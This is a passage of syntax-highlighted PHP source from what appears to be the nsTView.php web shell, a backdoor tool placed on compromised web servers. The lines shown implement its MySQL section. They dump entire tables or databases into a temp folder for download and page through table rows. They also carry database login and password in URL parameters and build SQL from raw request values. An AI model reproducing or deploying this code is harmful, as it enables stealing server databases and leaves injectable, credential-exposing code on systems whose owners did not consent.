<span class="lineno"> 651</span> <span class="s2">if(!is_writable(</span><span class="si">$f_d</span><span class="s2">)){die(&quot;</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">red</span><span class="o">&gt;</span><span class="k">This</span> <span class="nx">folder</span> <span class="nv">$f_d</span> <span class="nx">isnt</span> <span class="nx">writable</span><span class="o">!&lt;</span><span class="nx">br</span><span class="o">&gt;</span><span class="nx">Cannot</span> <span class="nx">make</span> <span class="nx">dump</span><span class="o">.&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
<span class="lineno"> 652</span> <span class="o">&lt;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">green</span><span class="o">&gt;&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">You</span> <span class="nx">can</span> <span class="nx">change</span> <span class="nx">temp</span> <span class="nx">folder</span> <span class="k">for</span> <span class="nx">dump</span> <span class="nb">file</span> <span class="nx">in</span> <span class="nx">your</span> <span class="nx">browser</span><span class="o">!&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
<span class="lineno"> 653</span> <span class="o">&lt;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">red</span><span class="o">&gt;</span><span class="nx">Change</span> <span class="nx">variable</span> <span class="o">&amp;</span><span class="nx">f_d</span><span class="o">=</span><span class="p">(</span><span class="nx">here</span> <span class="nx">writable</span> <span class="nx">directory</span><span class="p">,</span> <span class="nx">expl</span><span class="o">:</span> <span class="o">/</span><span class="nx">tmp</span> <span class="k">or</span> <span class="nx">c</span><span class="o">:/</span><span class="nx">windows</span><span class="o">/</span><span class="nx">temp</span><span class="p">)</span><span class="o">&lt;/</span><span class="nx">font</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
<span class="lineno"> 654</span> <span class="nx">Then</span> <span class="nx">press</span> <span class="nx">enter</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;&lt;/</span><span class="nx">font</span><span class="o">&gt;</span>
<span class="lineno"> 655</span> <span class="o">&lt;/</span><span class="nx">font</span><span class="o">&gt;</span><span class="s2">&quot;);}</span>
<span class="lineno"> 656</span> <span class="s2">mysql_select_db(</span><span class="si">$db</span><span class="s2">) or die(&quot;</span><span class="o">&lt;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">red</span><span class="o">&gt;</span><span class="s2">&quot;.mysql_error().&quot;</span><span class="o">&lt;/</span><span class="nx">font</span><span class="o">&gt;</span><span class="s2">&quot;);</span>
<span class="lineno"> 657</span> <span class="si">$fp</span><span class="s2"> = fopen(</span><span class="si">$f_d</span><span class="s2">.&quot;</span><span class="o">/</span><span class="s2">&quot;.</span><span class="si">$f</span><span class="s2">,&quot;</span><span class="nx">w</span><span class="s2">&quot;);</span>
<span class="lineno"> 658</span> <span class="s2">fwrite(</span><span class="si">$fp</span><span class="s2">, &quot;</span><span class="c1"># nsTView.php v$ver</span>
<span class="lineno"> 659</span> <span class="c1"># Web: http://nst.void.ru</span>
<span class="lineno"> 660</span> <span class="c1"># Dump from: &quot;.$_SERVER[&quot;SERVER_NAME&quot;].&quot; (&quot;.$_SERVER[&quot;SERVER_ADDR&quot;].&quot;)</span>
<span class="lineno"> 661</span> <span class="c1"># MySQL version: &quot;.mysql_get_server_info().&quot;</span>
<span class="lineno"> 662</span> <span class="c1"># PHP version: &quot;.phpversion().&quot;</span>
<span class="lineno"> 663</span> <span class="c1"># Date: &quot;.date(&quot;d.m.Y - H:i:s&quot;).&quot;</span>
<span class="lineno"> 664</span> <span class="c1"># Dump db ( $db ) Table ( $tbl )</span>
<span class="lineno"> 665</span> <span class="c1"># --- eof ---</span>
<span class="lineno"> 666</span> 
<span class="lineno"> 667</span> <span class="s2">&quot;);</span>
<span class="lineno"> 668</span> <span class="si">$que</span><span class="s2"> = mysql_query(&quot;</span><span class="nx">SHOW</span> <span class="nx">CREATE</span> <span class="nx">TABLE</span> <span class="sb">`$tbl`</span><span class="s2">&quot;) or die(&quot;</span><span class="o">&lt;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">red</span><span class="o">&gt;</span><span class="s2">&quot;.mysql_error().&quot;</span><span class="o">&lt;/</span><span class="nx">font</span><span class="o">&gt;</span><span class="s2">&quot;);</span>
<span class="lineno"> 669</span> <span class="si">$row</span><span class="s2"> = mysql_fetch_row(</span><span class="si">$que</span><span class="s2">);</span>
<span class="lineno"> 670</span> <span class="s2">fwrite(</span><span class="si">$fp</span><span class="s2">, &quot;</span><span class="nx">DROP</span> <span class="nx">TABLE</span> <span class="k">IF</span> <span class="nx">EXISTS</span> <span class="sb">`$tbl`</span><span class="p">;</span><span class="nx">\r\n</span><span class="s2">&quot;);</span>
<span class="lineno"> 671</span> <span class="si">$row[1]</span><span class="s2">=str_replace(&quot;</span><span class="nx">\n</span><span class="s2">&quot;,&quot;</span><span class="nx">\r\n</span><span class="s2">&quot;,</span><span class="si">$row[1]</span><span class="s2">);</span>
<span class="lineno"> 672</span> <span class="s2">fwrite(</span><span class="si">$fp</span><span class="s2">, </span><span class="si">$row[1]</span><span class="s2">.&quot;</span><span class="p">;</span><span class="nx">\r\n\r\n</span><span class="s2">&quot;);</span>
<span class="lineno"> 673</span> <span class="si">$que</span><span class="s2"> = mysql_query(&quot;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="sb">`$tbl`</span><span class="s2">&quot;);</span>
<span class="lineno"> 674</span> <span class="s2">if(mysql_num_rows(</span><span class="si">$que</span><span class="s2">)&gt;0){</span>
<span class="lineno"> 675</span> <span class="s2">while(</span><span class="si">$row</span><span class="s2"> = mysql_fetch_assoc(</span><span class="si">$que</span><span class="s2">)){</span>
<span class="lineno"> 676</span> <span class="si">$keys</span><span class="s2"> = join(&quot;</span><span class="sb">`, `</span><span class="s2">&quot;, array_keys(</span><span class="si">$row</span><span class="s2">));</span>
<span class="lineno"> 677</span> <span class="si">$values</span><span class="s2"> = array_values(</span><span class="si">$row</span><span class="s2">);</span>
<span class="lineno"> 678</span> <span class="s2">foreach(</span><span class="si">$values</span><span class="s2"> as </span><span class="si">$k</span><span class="s2">=&gt;</span><span class="si">$v</span><span class="s2">) </span><span class="si">{</span><span class="nv">$values</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nx">adds2</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span><span class="si">}</span><span class="s2"></span>
<span class="lineno"> 679</span> <span class="si">$values</span><span class="s2"> = implode(&quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot;, </span><span class="si">$values</span><span class="s2">);</span>
<span class="lineno"> 680</span> <span class="si">$sql</span><span class="s2"> = &quot;</span><span class="nx">INSERT</span> <span class="nx">INTO</span> <span class="sb">`$tbl`</span><span class="p">(</span><span class="sb">`$keys`</span><span class="p">)</span> <span class="nx">VALUES</span> <span class="p">(</span><span class="s1">&#39;&quot;.$values.&quot;&#39;</span><span class="p">);</span><span class="nx">\r\n</span><span class="s2">&quot;;</span>
<span class="lineno"> 681</span> <span class="s2">fwrite(</span><span class="si">$fp</span><span class="s2">, </span><span class="si">$sql</span><span class="s2">);</span>
<span class="lineno"> 682</span> <span class="s2">}</span>
<span class="lineno"> 683</span> <span class="s2">}</span>
<span class="lineno"> 684</span> <span class="s2">fclose(</span><span class="si">$fp</span><span class="s2">);</span>
<span class="lineno"> 685</span> <span class="s2">print &quot;</span><span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">0;URL=</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;baza=1&amp;dump_download=1&amp;f_d=</span><span class="si">$f_d</span><span class="s2">/</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 686</span> <span class="p">}</span><span class="c1">#end of dump</span>
<span class="lineno"> 687</span> 
<span class="lineno"> 688</span> 
<span class="lineno"> 689</span> 
<span class="lineno"> 690</span> 
<span class="lineno"> 691</span> <span class="c1"># db dump</span>
<span class="lineno"> 692</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;dump_db&#39;</span><span class="p">]){</span>
<span class="lineno"> 693</span> <span class="nv">$c</span><span class="o">=</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nb">mysql_list_tables</span><span class="p">(</span><span class="nv">$db</span><span class="p">));</span>
<span class="lineno"> 694</span> <span class="k">if</span><span class="p">(</span><span class="nv">$c</span><span class="o">&gt;=</span><span class="mi">1</span><span class="p">){</span>
<span class="lineno"> 695</span> <span class="k">print</span> <span class="s2">&quot;&lt;br&gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;Dump database &lt;b&gt;</span><span class="si">$db</span><span class="s2">&lt;/b&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 696</span> <span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="lineno"> 697</span> <span class="k">print</span> <span class="s2">&quot;&lt;br&gt;&lt;br&gt;&lt;font color=red&gt;Cannot dump database. No tables exists in &lt;b&gt;</span><span class="si">$db</span><span class="s2">&lt;/b&gt; db.&lt;/font&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 698</span> <span class="k">die</span><span class="p">;</span>
<span class="lineno"> 699</span> <span class="p">}</span>
<span class="lineno"> 700</span> <span class="k">if</span><span class="p">(</span><span class="nb">sizeof</span><span class="p">(</span><span class="nv">$tabs</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
<span class="lineno"> 701</span> <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW TABLES FROM </span><span class="si">$db</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno"> 702</span> <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
<span class="lineno"> 703</span> <span class="k">while</span><span class="p">(</span><span class="nv">$row</span><span class="o">=</span><span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$res</span><span class="p">)){</span>
<span class="lineno"> 704</span> <span class="nv">$tabs</span><span class="p">[]</span> <span class="o">.=</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="lineno"> 705</span> <span class="p">}</span>
<span class="lineno"> 706</span> <span class="p">}</span>
<span class="lineno"> 707</span> <span class="p">}</span>
<span class="lineno"> 708</span> <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$f_d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$f</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="lineno"> 709</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="s2">&quot;# nsTView.php v</span><span class="si">$ver</span><span class="s2"></span>
<span class="lineno"> 710</span> <span class="s2"># Web: http://nst.void.ru</span>
<span class="lineno"> 711</span> <span class="s2"># Dump from: &quot;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; (&quot;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;SERVER_ADDR&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;)</span>
<span class="lineno"> 712</span> <span class="s2"># MySQL version: &quot;</span><span class="o">.</span><span class="nb">mysql_get_server_info</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="lineno"> 713</span> <span class="s2"># PHP version: &quot;</span><span class="o">.</span><span class="nb">phpversion</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="lineno"> 714</span> <span class="s2"># Date: &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d.m.Y - H:i:s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="lineno"> 715</span> <span class="s2"># Dump db ( </span><span class="si">$db</span><span class="s2"> )</span>
<span class="lineno"> 716</span> <span class="s2"># --- eof ---</span>
<span class="lineno"> 717</span> 
<span class="lineno"> 718</span> <span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno"> 719</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$tabs</span> <span class="k">as</span> <span class="nv">$tab</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 720</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s2">&quot;DROP TABLE IF EXISTS `</span><span class="si">$tab</span><span class="s2">`;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno"> 721</span> <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW CREATE TABLE `</span><span class="si">$tab</span><span class="s2">`&quot;</span><span class="p">);</span>
<span class="lineno"> 722</span> <span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
<span class="lineno"> 723</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$row</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="lineno"> 724</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;;</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno"> 725</span> <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM `</span><span class="si">$tab</span><span class="s2">`&quot;</span><span class="p">);</span>
<span class="lineno"> 726</span> <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
<span class="lineno"> 727</span> <span class="k">while</span><span class="p">(</span><span class="nv">$row</span><span class="o">=</span><span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$res</span><span class="p">)){</span>
<span class="lineno"> 728</span> <span class="nv">$keys</span> <span class="o">=</span> <span class="nb">join</span><span class="p">(</span><span class="s2">&quot;`, `&quot;</span><span class="p">,</span> <span class="nb">array_keys</span><span class="p">(</span><span class="nv">$row</span><span class="p">));</span>
<span class="lineno"> 729</span> <span class="nv">$values</span> <span class="o">=</span> <span class="nb">array_values</span><span class="p">(</span><span class="nv">$row</span><span class="p">);</span>
<span class="lineno"> 730</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$values</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$values</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nx">adds2</span><span class="p">(</span><span class="nv">$v</span><span class="p">);}</span>
<span class="lineno"> 731</span> <span class="nv">$values</span> <span class="o">=</span> <span class="nb">join</span><span class="p">(</span><span class="s2">&quot;&#39;, &#39;&quot;</span><span class="p">,</span> <span class="nv">$values</span><span class="p">);</span>
<span class="lineno"> 732</span> <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;INSERT INTO `</span><span class="si">$tab</span><span class="s2">`(`</span><span class="si">$keys</span><span class="s2">`) VALUES (&#39;</span><span class="si">$values</span><span class="s2">&#39;);</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 733</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
<span class="lineno"> 734</span> <span class="p">}}</span>
<span class="lineno"> 735</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\r\n\r\n\r\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno"> 736</span> <span class="p">}</span>
<span class="lineno"> 737</span> <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="lineno"> 738</span> <span class="k">print</span> <span class="s2">&quot;&lt;meta http-equiv=</span><span class="se">\&quot;</span><span class="s2">REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">0;URL=</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;baza=1&amp;dump_download=1&amp;f_d=</span><span class="si">$f_d</span><span class="s2">/</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 739</span> <span class="p">}</span><span class="c1">#end of db dump</span>
<span class="lineno"> 740</span> 
<span class="lineno"> 741</span> 
<span class="lineno"> 742</span> 
<span class="lineno"> 743</span> 
<span class="lineno"> 744</span> 
<span class="lineno"> 745</span> 
<span class="lineno"> 746</span> <span class="nv">$vnutr</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;vnutr&#39;</span><span class="p">];</span>
<span class="lineno"> 747</span> <span class="nv">$tbl</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;tbl&#39;</span><span class="p">];</span>
<span class="lineno"> 748</span> <span class="k">if</span><span class="p">(</span><span class="nv">$vnutr</span> <span class="k">and</span> <span class="o">!</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ins_new_line&#39;</span><span class="p">]){</span>
<span class="lineno"> 749</span> <span class="k">print</span> <span class="s2">&quot;&lt;table cellpadding=0 cellspacing=1&gt;&lt;tr&gt;&lt;td&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 750</span> 
<span class="lineno"> 751</span> <span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$db</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
<span class="lineno"> 752</span> <span class="nv">$c</span><span class="o">=</span><span class="nb">mysql_query</span> <span class="p">(</span><span class="s2">&quot;SELECT COUNT(*) FROM </span><span class="si">$tbl</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno"> 753</span> <span class="nv">$cfa</span><span class="o">=</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
<span class="lineno"> 754</span> <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
<span class="lineno"> 755</span> <span class="k">print</span> <span class="s2">&quot;</span>
<span class="lineno"> 756</span> <span class="s2">Total: </span><span class="si">$cfa[0]</span><span class="s2"></span>
<span class="lineno"> 757</span> <span class="s2">&lt;form&gt;</span>
<span class="lineno"> 758</span> <span class="s2">From: &lt;input name=from size=3 value=0&gt;</span>
<span class="lineno"> 759</span> <span class="s2">To: &lt;input name=to size=3 value=&#39;</span><span class="si">$cfa[0]</span><span class="s2">&#39;&gt;</span>
<span class="lineno"> 760</span> <span class="s2">&lt;input type=submit name=show value=Show&gt;</span>
<span class="lineno"> 761</span> <span class="s2">&lt;input type=hidden name=vnutr value=1&gt;</span>
<span class="lineno"> 762</span> <span class="s2">&lt;input type=hidden name=vn value=&#39;</span><span class="si">$vn</span><span class="s2">&#39;&gt;</span>
<span class="lineno"> 763</span> <span class="s2">&lt;input type=hidden name=db value=&#39;</span><span class="si">$db</span><span class="s2">&#39;&gt;</span>
<span class="lineno"> 764</span> <span class="s2">&lt;input type=hidden name=login value=&#39;</span><span class="si">$login</span><span class="s2">&#39;&gt;</span>
<span class="lineno"> 765</span> <span class="s2">&lt;input type=hidden name=pass value=&#39;</span><span class="si">$pass</span><span class="s2">&#39;&gt;</span>
<span class="lineno"> 766</span> <span class="s2">&lt;input type=hidden name=adress value=&#39;</span><span class="si">$adress</span><span class="s2">&#39;&gt;</span>
<span class="lineno"> 767</span> <span class="s2">&lt;input type=hidden name=conn value=1&gt;</span>
<span class="lineno"> 768</span> <span class="s2">&lt;input type=hidden name=baza value=1&gt;</span>
<span class="lineno"> 769</span> <span class="s2">&lt;input type=hidden name=p value=sql&gt;</span>
<span class="lineno"> 770</span> <span class="s2">&lt;input type=hidden name=tbl value=&#39;</span><span class="si">$tbl</span><span class="s2">&#39;&gt;</span>
<span class="lineno"> 771</span> <span class="s2"> [&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?getdb=1&amp;to=</span><span class="si">$cfa[0]</span><span class="s2">&amp;vnutr=1&amp;vn=</span><span class="si">$vn</span><span class="s2">&amp;db=</span><span class="si">$db</span><span class="s2">&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;baza=1&amp;p=sql&amp;tbl=</span><span class="si">$tbl</span><span class="s2">&#39;&gt;DOWNLOAD&lt;/a&gt;] [&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?to=</span><span class="si">$cfa[0]</span><span class="s2">&amp;vnutr=1&amp;vn=</span><span class="si">$vn</span><span class="s2">&amp;db=</span><span class="si">$db</span><span class="s2">&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;baza=1&amp;p=sql&amp;tbl=</span><span class="si">$tbl</span><span class="s2">&amp;ins_new_line=1&#39;&gt;INSERT&lt;/a&gt;] [&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?to=</span><span class="si">$cfa[0]</span><span class="s2">&amp;vnutr=1&amp;vn=</span><span class="si">$vn</span><span class="s2">&amp;db=</span><span class="si">$db</span><span class="s2">&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;baza=1&amp;p=sql&amp;tbl=</span><span class="si">$tbl</span><span class="s2">&amp;dump=1&amp;f_d=</span><span class="si">$d</span><span class="s2">&#39;&gt;DUMP&lt;/a&gt;]</span>
<span class="lineno"> 772</span> <span class="s2">&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 773</span> <span class="nv">$vn</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;vn&#39;</span><span class="p">];</span>
<span class="lineno"> 774</span> <span class="nv">$from</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;from&#39;</span><span class="p">];</span>
<span class="lineno"> 775</span> <span class="nv">$to</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;to&#39;</span><span class="p">];</span>
<span class="lineno"> 776</span> <span class="nv">$from</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;from&#39;</span><span class="p">];</span>
<span class="lineno"> 777</span> <span class="nv">$to</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;to&#39;</span><span class="p">];</span>
<span class="lineno"> 778</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$from</span><span class="p">)){</span><span class="nv">$from</span><span class="o">=</span><span class="mi">0</span><span class="p">;}</span>
<span class="lineno"> 779</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$to</span><span class="p">)){</span><span class="nv">$to</span><span class="o">=</span><span class="mi">50</span><span class="p">;}</span>
<span class="lineno"> 780</span> <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM </span><span class="si">$vn</span><span class="s2"> LIMIT </span><span class="si">$from</span><span class="s2">,</span><span class="si">$to</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 781</span> <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
<span class="lineno"> 782</span> <span class="nv">$result1</span><span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
<span class="lineno"> 783</span> <span class="k">print</span> <span class="nv">$del_result</span><span class="p">;</span>
<span class="lineno"> 784</span> <span class="k">print</span> <span class="s2">&quot;&lt;table cellpadding=0 cellspacing=1 border=1&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 785</span> <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">mysql_num_fields</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
<span class="lineno"> 786</span> <span class="nv">$name</span><span class="o">=</span><span class="nb">mysql_field_name</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="nv">$i</span><span class="p">);</span>
<span class="lineno"> 787</span> <span class="nv">$type</span>  <span class="o">=</span> <span class="nb">mysql_field_type</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span>
<span class="lineno"> 788</span> <span class="nv">$len</span>  <span class="o">=</span> <span class="nb">mysql_field_len</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span>
<span class="lineno"> 789</span> <span class="k">print</span> <span class="s2">&quot;&lt;td bgcolor=#BCE0FF&gt; </span><span class="si">$name</span><span class="s2"> (&lt;b&gt;</span><span class="si">$type</span><span class="s2">(</span><span class="si">$len</span><span class="s2">)&lt;/b&gt;)&lt;/td&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 790</span> <span class="p">}</span>
<span class="lineno"> 791</span> <span class="k">print</span> <span class="s2">&quot;&lt;/tr&gt;&lt;pre&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 792</span> 
<span class="lineno"> 793</span> <span class="k">while</span><span class="p">(</span><span class="nv">$mn</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_ASSOC</span><span class="p">)){</span>
<span class="lineno"> 794</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$mn</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&gt;</span><span class="nv">$inside</span><span class="p">){</span>
<span class="lineno"> 795</span> <span class="nv">$buffer1</span> <span class="o">.=</span> <span class="s2">&quot;`</span><span class="si">$key</span><span class="s2">`=&#39;&quot;</span><span class="o">.</span><span class="nx">adds</span><span class="p">(</span><span class="nv">$inside</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39; AND &quot;</span><span class="p">;</span>
<span class="lineno"> 796</span> <span class="nv">$b1</span> <span class="o">.=</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$inside</span><span class="p">,</span> <span class="nx">ENT_NOQUOTES</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;nbsp;&lt;/td&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 797</span> <span class="p">}</span>
<span class="lineno"> 798</span> <span class="nv">$buffer1</span>  <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$buffer1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$buffer1</span><span class="p">)</span><span class="o">-</span><span class="mi">5</span><span class="p">);</span>
<span class="lineno"> 799</span> <span class="nv">$buffer1</span>  <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$buffer1</span><span class="p">);</span>
<span class="lineno"> 800</span> <span class="k">print</span> <span class="s2">&quot;&lt;td&gt;</span>
<span class="lineno"> 801</span> <span class="s2">&lt;form method=post action=&#39;</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;tbl=</span><span class="si">$tbl</span><span class="s2">&amp;vnutr=1&amp;baza=1&amp;vn=</span><span class="si">$vn</span><span class="s2">&amp;db=</span><span class="si">$db</span><span class="s2">&#39;&gt;</span>
